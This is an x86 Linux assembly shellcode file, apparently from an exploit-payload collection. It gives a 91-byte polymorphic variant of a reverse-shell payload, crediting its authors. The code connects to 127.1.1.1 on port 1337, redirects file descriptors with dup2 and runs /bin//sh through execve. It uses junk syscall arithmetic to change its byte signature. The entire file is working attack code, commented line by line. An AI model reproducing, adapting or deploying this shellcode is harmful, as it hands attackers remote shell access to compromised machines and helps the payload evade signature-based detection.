; Author: Julien Ahrens (@MxTuxracer)
; Polymorphic version: @bugsam
; Date: 07/31/2020
; Original: 74 bytes
; Version: 91 bytes

global _start

_start:
	push 0x66		; (EAX) -> SYS_socketcall
	mov eax, [esp]
	cdq

	; socket *args
	push edx		; args[2] -> protocol 0 [IP_PROTO]
	push byte 0x01		; args[1] -> type 1 [SOCK_STREAM]
	push byte 0x02		; args[0] -> domain 2 [AF_INET]

	mov ecx, esp		; (ECX) -> *args[0]
	mov ebx, dword[esp+4]	; (EBX) <- call 0x01 (SYS_SOCKET))
	int 0x80		; call syscall SYS_socketcall, returns  (EAX) <- socketfd

	; struct sockaddr_in
	push 0x101017f		; sin_addr <- 127.1.1.1 (7f010101)
	push word 0x3905	; sin_port <- 0539 (1337)
	push word 0x02		; sa_family <- 0x02 (AF_INET)
			
	; connect *args
	push 0x10		; socklen_t <- defined in SOCK_SIZE <- 0x10 
	lea ecx, [esp+0x04]
	push ecx		; sockaddr <- memory address of struct sockaddr_in
	push eax		; sockfd

	mov ecx, esp		; (ECX) -> *args
	mov bl, 0x03		; (EBX) <- call 0x03 (SYS_CONNECT)
	mov al, byte[esp+0x20]	; (EAX) -> SYS_socketcall
	int 0x80		; call syscall SYS_socketcall, 

	mov ecx, dword[esp+0x14]	; (ECX) 0x02 (newfd)
	mov ebx, dword[esp+0x1c]	; (EBX) 0x00 (oldfd)
fd:
	mov al, byte[esp+0xf]	; (EAX) 0x39 SYS_setpgid (trash)
	add al, byte[esp+0xe]	; (EAX) 0x3e SYS_ustat (trash)
	inc eax			; (EAX) 0x3f SYS_dup2
	int 0x80		; call syscall SYS_dup2
	loop fd 

	mov al,0xb		; (EAX) SYS_execve
	push word[esp+0x1c]	; 0x00 ASCII NUL 'end of string'
	push 0x68732f2f		; 0x68 ASCII 'h'; 0x73 ASCII 's'; 0x2f ASCII '/'; 0x2f ASCII '/'
	push 0x6e69622f		; 0x6e ASCII 'n'; 0x69 ASCII 'i'; 0x62 ASCII 'b'; 0x2f ASCII '/'
	mov ebx,esp		; (EBX) *pathname
	int 0x80		; call systemcall SYS_execve
